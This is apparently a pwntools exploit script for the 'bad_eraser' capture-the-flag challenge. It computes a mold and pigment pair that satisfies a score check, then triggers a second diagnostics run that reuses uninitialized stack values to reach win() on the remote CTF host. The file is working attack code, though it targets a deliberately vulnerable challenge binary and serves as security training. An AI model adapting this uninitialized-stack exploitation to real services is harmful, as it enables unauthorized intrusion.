#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./bad_eraser", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org"
PORT = int(args.PORT or 32768)
TARGET_SCORE = 0x23CCD


def start():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT)


def find_calibration_pair(target=TARGET_SCORE):
    # clutch_score(mold, pigment) = (((mold >> 2) & 0x43) | pigment) + 2*pigment
    # Choose mold=0 so (((mold >> 2) & 0x43) == 0, then score becomes 3*pigment.
    # pigment = target // 3 works when target % 3 == 0.
    if target % 3 == 0:
        pigment = target // 3
        mold = 0
        return mold, pigment

    # Generic fallback brute-force (rarely needed for this challenge).
    candidates_a = [0, 1, 2, 3, 0x40, 0x41, 0x42, 0x43]
    for pigment in range(0, 1 << 20):
        for a in candidates_a:
            if ((a | pigment) + (pigment << 1)) == target:
                mold = a << 2
                return mold, pigment
    raise ValueError("No valid calibration pair found")


def exploit(io):
    # Step 1: calculate valid values that force diagnostics to call win().
    mold_id, pigment_code = find_calibration_pair()
    log.info(f"Using mold_id={mold_id} pigment_code={pigment_code} (0x{pigment_code:x})")

    # Step 2: first diagnostics run initializes service and stores our pair
    # in stack locals of workshop_turn().
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Enter mold id and pigment code.\n", f"{mold_id} {pigment_code}".encode())

    # Step 3: second diagnostics run reuses uninitialized stack values.
    io.sendlineafter(b"> ", b"3")

    # If the remote has real flag.txt, output should contain flag here.
    io.interactive()


if __name__ == "__main__":
    io = start()
    exploit(io)